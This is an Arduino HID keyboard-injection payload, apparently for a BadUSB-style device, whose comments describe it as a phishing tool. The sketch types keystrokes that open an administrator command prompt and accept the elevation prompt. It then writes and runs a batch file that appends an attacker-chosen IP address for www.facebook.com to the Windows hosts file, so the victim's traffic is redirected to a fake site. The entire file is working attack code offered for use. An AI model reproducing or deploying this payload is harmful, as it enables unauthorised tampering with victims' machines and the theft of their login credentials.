#include <HID-Project.h>
#include <HID-Settings.h>

// Utility function
void typeKey(int key){
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup()
{
  // Start Keyboard and Mouse
  AbsoluteMouse.begin();
  Keyboard.begin();
  delay(3000);
  // Start Payload
  // Author: .:Koryusai-Kun:.

  // Description: Used for phishing, it add's an ip of your choosing to the hosts file on windows

  // Description: so when the user types into there web browser for example www.facebook.com it

  // Description: insted of going to the proper ip it gose to the one in the host file your evil one.

  // Description: you need to add the www. version and with out it as well.

  // ---[Start CMD as administrator]-----------------------

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(114);
  Keyboard.releaseAll();
  delay(600);
  Keyboard.write(KEY_RETURN);

  delay(200);

  Keyboard.print("cmd");

  delay(150);

  typeKey(229);

  delay(75);

  Keyboard.print("a");

  Keyboard.write(KEY_RETURN);

  delay(200);

  typeKey(KEY_LEFT_ARROW);
  delay(200);
  Keyboard.write(KEY_RETURN);
  delay(200);
  Keyboard.print("cls");
  delay(200);
  Keyboard.write(KEY_RETURN);

  // ---[END]----------------------------------------------

  delay(300);

  // ---[Inject into the host file]------------------------

  Keyboard.print("copy con inject.bat");
  delay(200);
  Keyboard.write(KEY_RETURN);
  delay(200);
  Keyboard.print("SET NEWLINE=^& echo.");
  delay(200);
  Keyboard.write(KEY_RETURN);
  delay(200);
  Keyboard.write(KEY_RETURN);
  delay(200);
  Keyboard.print("FIND /C /I \"[www.facebook.com]\" %WINDIR%\\system32\\drivers\\etc\\hosts");
  delay(200);
  Keyboard.write(KEY_RETURN);
  delay(200);
  Keyboard.print("IF %ERRORLEVEL% NEQ 0 ECHO %NEWLINE%^[192.168.0.34] [www.facebook.com]>>%WINDIR%\\system32\\drivers\\etc\\hosts");
  delay(200);
  Keyboard.write(KEY_RETURN);
  delay(200);
  Keyboard.write(KEY_RETURN);
  delay(200);
  Keyboard.print("FIND /C /I \"[www.facebook.com]\" %WINDIR%\\system32\\drivers\\etc\\hosts");
  delay(200);
  Keyboard.write(KEY_RETURN);
  delay(200);
  Keyboard.print("IF %ERRORLEVEL% NEQ 0 ECHO %NEWLINE%^[192.168.0.34] [www.facebook.com]>>%WINDIR%\\system32\\drivers\\etc\\hosts");
  delay(200);
  Keyboard.write(KEY_RETURN);
  delay(200);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(122);
  Keyboard.releaseAll();
  delay(200);
  Keyboard.write(KEY_RETURN);
  delay(200);
  Keyboard.print("inject.bat");
  delay(200);
  Keyboard.write(KEY_RETURN);

  // ---[END]----------------------------------------------

  delay(200);

  Keyboard.print("exit");
  delay(200);
  Keyboard.write(KEY_RETURN);
  delay(200);
  // End Payload

  // Stop Keyboard and Mouse
  Keyboard.end();
  AbsoluteMouse.end();
}

// Unused
void loop() {}
